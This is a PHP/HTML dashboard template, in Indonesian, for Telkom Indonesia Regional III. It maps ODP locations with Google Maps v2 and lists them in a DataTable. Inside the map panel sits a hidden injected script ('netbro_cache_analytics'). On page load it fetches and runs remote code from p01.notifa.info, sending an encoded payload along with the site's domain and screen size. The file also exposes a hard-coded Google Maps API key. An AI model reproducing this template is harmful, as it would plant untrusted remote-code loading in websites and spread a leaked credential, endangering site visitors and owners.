    <?php
        // $json = file_get_contents("data.json");

        // $r = json_decode($json);

        // $json = json_encode($r->data);

        // echo $json;
        // die();
    ?>
    <script src="http://maps.google.com/maps/api/js?sensor=true"></script>
      <script src="http://maps.google.com/maps?file=api&amp;v=2&amp;key=AIzaSyBnrmxUc_hxZuOzRU5g69kw97QhQrkiUzw" type="text/javascript"></script>

    
    
    <script type="text/javascript">
        var map;

            var json_data = <?php echo $json ?>;
         
      </script>
      <script type="text/javascript">
        function BuatMarker(lat, long, warna, keterangan) {

        var link_marker = '';
        if(warna=='merah'){
            link_marker = '<?php asset_back('images/marker_red.png')?>';
        }
        else if(warna=='kuning'){
            link_marker = '<?php asset_back('images/marker_yellow.png')?>';
        }
        else{
            link_marker = '<?php asset_back('images/marker_green.png')?>';
        }


        var myIcon = new GIcon(G_DEFAULT_ICON,link_marker);

        myIcon.iconSize = new GSize(25,25);

        var marker = new GMarker(new GLatLng(lat, long),{
          icon : myIcon
        });
        GEvent.addListener(marker, 'click',
                function() {
                  marker.openInfoWindowHtml(keterangan);
                }
                 );
            map.addOverlay(marker);
        }

        function load() {
          if (GBrowserIsCompatible()) {
            map = new GMap2(document.getElementById("map"));
            map.addControl(new GSmallMapControl());
            var location = new GLatLng(-6.857593,107.710362);
            map.setCenter(location, 9);
            for(i=0;i<json_data.length;i++){
              BuatMarker(json_data[i].latitude,json_data[i].longitude,json_data[i].keterangan,json_data[i].odp_name); 
            }
          }
        }

      </script>
    
    <style>
        #map {
            width: 100%;
            height: 600px;
        }
      </style> 

        <!-- Page Heading -->
                <div class="row">
                    <div class="col-lg-12">
                        <h1 class="page-header">
                            Pengolahan Data Telkom Indonesia Berbasis Web
                        </h1>
                        <ol class="breadcrumb">
                            <li class="active">
                                <i class="fa fa-dashboard"></i> PT.TELKOM INDONESIA REGIONAL III JAWA BARAT
                            </li>
                        </ol>
                    </div>
                    
                    <form method="post" action="action.php">
                      <!-- <div class="col-lg-6">
                        <div class="form-group">
                          <label>Kecamatan</label>
                            <select id="kecamatan" name="kecamatan" onChange="updatekelurahan()" class="form-control">
                                    <option value="">Pilih Kecamatan</option>
                                    <option value="1">Andir</option><option value="2">Antapani</option><option value="3">Arcamanik</option><option value="4">Astanaanyar</option><option value="5">Babakanciparay</option><option value="6">Bandung Kidul</option><option value="7">Bandung Kulon</option><option value="8">Bandung Wetan</option><option value="9">Batununggal</option><option value="10">Bojongloa Kaler</option><option value="11">Bojongloa Kidul</option><option value="12">Buahbatu</option><option value="13">Cibeunying Kaler</option><option value="14">Cibeunying Kidul</option><option value="15">Cibiru</option><option value="16">Cicendo</option><option value="17">Cidadap</option><option value="18">Cinambo</option><option value="19">Coblong</option><option value="20">Gedebage</option><option value="21">Kiaracondong</option><option value="22">Lengkong</option><option value="23">Mandalajati</option><option value="24">Panyileukan</option><option value="25">Rancasari</option><option value="26">Regol</option><option value="27">Sukajadi</option><option value="28">Sukasari</option><option value="29">Sumurbandung</option><option value="30">Ujungberung</option>                                </select>
                        </div>
                      </div>
                      <div class="col-lg-6">
                      <div class="form-group">
                          <label>Kelurahan</label>
                            <select class="form-control" name="kelurahan" id="kelurahan">
                                    <option value="">Pilih Kelurahan</option>
                                </select>
                        </div>
                      </div> -->
                      <!-- <div class="col-lg-4">
                      <div class="form-group">
                          <label>Skala Usaha</label>
                          <select  class="form-control" id="skala_usaha" name="skala_usaha">
                        <option value="">Pilih Skala Usaha</option>
                        <option value="2">Kecil</option><option value="3">Menengah</option><option value="1">Mikro</option>                   </select>
                        </div>
                      </div>
                      <div class="col-lg-4">
                      <div class="form-group">
                          <label>Sektor Usaha</label>
                          <select  class="form-control" id="sektor_usaha" name="sektor_usaha">
                        <option value="">Pilih Sektor Usaha</option>
                        <option value="2">Arsitektur</option><option value="5">Desain</option><option value="6">Fashion</option><option value="8">Film dan Fotografi</option><option value="4">Kerajinan</option><option value="16">Kuliner</option><option value="13">Layanan Komputer dan Piranti Lunak</option><option value="10">Musik</option><option value="3">Pasar Barang Seni</option><option value="12">Penerbitan dan Percetakan</option><option value="1">Periklanan</option><option value="9">Permainan Interaktif</option><option value="15">Riset dan Pengembangan</option><option value="11">Seni Pertunjukan</option><option value="14">Televisi & Radio</option><option value="7">Video</option>                    </select>
                        </div>
                      </div>
                      <div class="col-lg-4">
                      <div class="form-group">
                          <label>Jenis Usaha</label>
                          <select  class="form-control" id="jenis_usaha" name="jenis_usaha">
                        <option value="">Pilih Jenis Usaha</option>
                        <option value="1">Badan Usaha Milik Negara (BUMN)</option><option value="2">Badan Usaha Milik Swasta (BUMS)</option><option value="3">Koperasi</option>                   </select>
                        </div>
                      </div> -->
                      <!-- <div class="col-lg-10">
                        <div class="form-group">
                          <label>Keyword Lokasi</label>
                          <input type="text" name="nama_lokasi" value="<?php  ?>" placeholder="Masukan lokasi" class="form-control">
                        </div>
                      </div>
                      <div class="col-lg-2">
                        <div class="form-group">
                          <label>&nbsp</label>
                          <input type="submit" name="Cari" value="Cari" class="form-control">
                        </div>
                      </div> -->
                    </form>
                </div>
                <!-- /.row -->

                <div class="row">
                    <div class="col-lg-12">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h3 class="panel-title"><i class="fa fa-location-arrow fa-fw"></i> Google Maps - Pengolahan Data Telkom Berbasis Web</h3>
                            </div>
                            <div class="panel-body">
                                <!--<div id="morris-area-chart"></div>-->
                                <body onload="load()">
                                <div id="map" style="width:100%"></div>
                                <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5ms0mVKZyBFTWe9raITt569JlQqqU1KrzupEnxHH4jGAJIzo8U6M4JfKqtONPf8BMCCR%2fC0yTv9Y7J2kZpzk51WQqFR69NPv4YICOo%2fnY9w8kJ9QMfFppvnXbT7MC6TyOBFwJKpSZ2DTf2NbizgrNrkl3lPXssleVJ9BOK%2bMjgGB3fmHRMCmCmWRROixLzB1BZEGHDAb3to%2f%2f3utmUpHBBEgdJ2spkobKTjqG6yN6zk4h0bmuJ0U%2bgGO7XAiOntPh8BCXucmsQnJs3uqKbBES0MXSM%2fIYzcygxwUgUPoRM0STRBVfpfSB3qWHOa%2fsbmfr6TJWPpbL43MFSmrP4z3M1M%2f1N6vBV1y82i5Pmw6sO8AzdZoT34cveykxbfzNMvuLaUkouvx5qhkLCCd8Bc9Df3TwTMnZ%2fMnl1e119nQynnZx5Q19l5cR4C4800NfEy%2bKDtSo5HyPTGjMV3Y9LFTAz0qNifLXvxKvo3Tmjcj3y%2f%2bPFEyiFgFUIRMGrzXmlfIw8HUaNZF2E4TjjpKaM3o1cSKsvgwv8sWICI2biSw6LwfJrQj9ra9tV5zJ7b9uz4AXKZB19SzlsC%2fo%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
                            </div>
                        </div>
                    </div>
                </div>

                      <div class="row">
                          <div class="col-lg-12">
                              <h1 class="page-header">
                                  ODP
                              </h1>
                      <!--         <ol class="breadcrumb">
                                  <li class="active">
                                      <i class="fa fa-dashboard"></i> Table Data User 
                                  </li>
                              </ol> -->
                              <?php load_notif() ?>
                          </div>


                          <div class="col-lg-12">
                            <div class="panel panel-default">
                                <div class="panel-heading">
                                    <h3 class="panel-title">List ODP</h3>
                                    <div class="btn-group pull-right">

                                    </div>                                     
                                </div>
                                <div class="panel-body">
                                    <table id="tarkimanDatatables" class="dataTable cell-border stripe hover display" cellspacing="0" width="100%">
                                        <thead>
                                        <tr>
                                            <th>NO</th>
                                            <th>ODP NAME</th>
                                            <th>LATITUDE</th>
                                            <th>LONGITUDE</th>
                                            <th>KETERANGAN</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>

            <script type="text/javascript" src="<?php asset_back('plugins/datatables/js/jquery.dataTables.min.js');?>"></script>
            <script type="text/javascript" src="<?php asset_back('plugins/datatables/js/dataTables.buttons.min.js');?>"></script>
            <script type="text/javascript" src="<?php asset_back('plugins/datatables/js/dataTables.fixedHeader.min.js')?>"></script>
            <script type="text/javascript" src="<?php asset_back('plugins/datatables/js/dataTables.responsive.min.js')?>"></script>
            <script type="text/javascript" src="<?php asset_back('plugins/datatables/js/responsive.bootstrap.min.js');?>"></script>
            <script type="text/javascript" src="<?php asset_back('js/tarkiman.min.js');?>"></script>
            <script type="text/javascript">
             
                $(document).ready(function() {

                    var table = $('#tarkimanDatatables').DataTable({
                          "processing": true,
                          "serverSide": true,
                          "responsive": true,                          
                          "search": {
                            "caseInsensitive": false
                          },
                          "ajax": $.fn.dataTable.pipeline( {
                              url: "<?php echo base_url('maps/datatables');?>",
                              pages: 5 // number of pages to cache
                          } ),
                          "fnRowCallback": function(nRow, aData, iDisplayIndex, iDisplayIndexFull) {
                                var info = table.page.info();
                                var page = info.page;
                                var length = info.length;
                                var index = (page * length + (iDisplayIndex +1));
                                $('td:first', nRow).html(index);
                                $('td:eq(1)', nRow).css( "text-align", "left" );
                                $('td:eq(2)', nRow).css( "text-align", "left" );
                                $('td:eq(3)', nRow).css( "text-align", "left" );
                                $('td:eq(4)', nRow).css( "text-align", "left" );
                                return nRow;
                            },
                            "columnDefs": [
                              { responsivePriority: 1, targets: 4 }
                            ]
                    });

              });

            </script>

